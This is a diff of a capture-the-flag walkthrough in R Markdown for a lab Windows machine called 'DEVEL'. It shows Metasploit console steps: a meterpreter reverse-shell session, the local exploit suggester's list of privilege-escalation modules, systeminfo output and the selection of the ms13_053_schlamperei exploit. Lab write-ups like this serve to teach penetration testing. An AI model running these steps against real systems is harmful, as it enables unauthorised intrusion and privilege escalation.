@@ -168,20 +168,10 @@ We got **_shellz_**
 
 Lets check out what we have
 ```{r, engine='bash', count_lines}
-msf exploit(handler) > sessions -i
-
-Active sessions
-===============
-
-  Id  Type                     Information              Connection
-  --  ----                     -----------              ----------
-  1   meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.15.155:4444 -> 10.10.10.5:49206 (10.10.10.5)
-
 msf exploit(handler) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > 
-
 ```
 
 We try and browse to the user directory for our flag and we get **Access Denied**
@@ -204,28 +194,13 @@ Our best bet is to go to the local exploit sugester (best = easier in this case)
 
 We start by putting the current meterpreter sessoin in the background and invoking the local exploit suggester module
 ```{r, engine='bash', count_lines}
-meterpreter > background 
-[*] Backgrounding session 1...
 msf exploit(handler) > use post/multi/recon/local_exploit_suggester 
-msf post(local_exploit_suggester) > show options
-
-Module options (post/multi/recon/local_exploit_suggester):
-
-   Name             Current Setting  Required  Description
-   ----             ---------------  --------  -----------
-   SESSION                           yes       The session to run this module on.
-   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
-
 msf post(local_exploit_suggester) > set SESSION 1
 SESSION => 1
 ```
 
 It has some juicy info for us
 ```{r, engine='bash', count_lines}
-msf post(local_exploit_suggester) > run
-
-[*] 10.10.10.5 - Collecting local exploits for x86/windows...
-[*] 10.10.10.5 - 37 exploit checks are being tried...
 [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
 [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
 [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
@@ -242,15 +217,6 @@ msf post(local_exploit_suggester) > run
 
 We know what exploits are suggester, to make sure, lets see what Hotfixes are installed
 ```{r, engine='bash', count_lines}
-msf post(local_exploit_suggester) > sessions -i 1
-[*] Starting interaction with 1...
-
-meterpreter > shell
-Process 2420 created.
-Channel 1 created.
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
 C:\Users>systeminfo
 systeminfo
 
@@ -299,6 +265,8 @@ Network Card(s):           1 NIC(s) Installed.
 Lets get ready to rumble!!!
 
 Select our exploit and set its options
+**_NOTE_**: we need to change the port from 4444 to 4443
+This is because our primary exploit(the dotaplayer.aspx reverse shell) is connected on port 4444
 ```{r, engine='bash', count_lines}
 msf post(local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
 msf exploit(ms13_053_schlamperei) > set SESSION 1
